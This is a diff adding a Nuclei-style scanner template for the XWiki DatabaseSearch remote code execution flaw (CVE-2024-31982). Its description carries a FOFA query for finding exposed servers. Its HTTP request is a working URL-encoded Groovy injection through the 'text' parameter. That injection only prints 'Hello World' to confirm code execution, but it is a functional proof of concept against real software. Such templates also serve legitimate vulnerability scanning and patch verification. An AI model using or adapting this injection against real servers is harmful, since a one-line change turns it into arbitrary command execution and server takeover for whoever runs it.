@@ -1,0 +1,26 @@
+id: xwiki-databasesearch-rce
+
+info:
+  name: "XWiki DatabaseSearch接口远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="data-xwiki-reference"
+      XWiki DatabaseSearch接口存在远程代码执行漏洞（CVE-2024-31982），攻击者可利用该漏洞执行任意系统命令，从而获取服务器控制权限。此漏洞可能造成敏感数据泄露、系统文件篡改及服务中断等严重后果。
+  reference:
+  - CVE-2024-31982
+  tags: XWiki
+
+http:
+- raw:
+  - |
+    GET /xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync+async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello+World!%22++%2B+%2850+%2B+49%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Hello World'
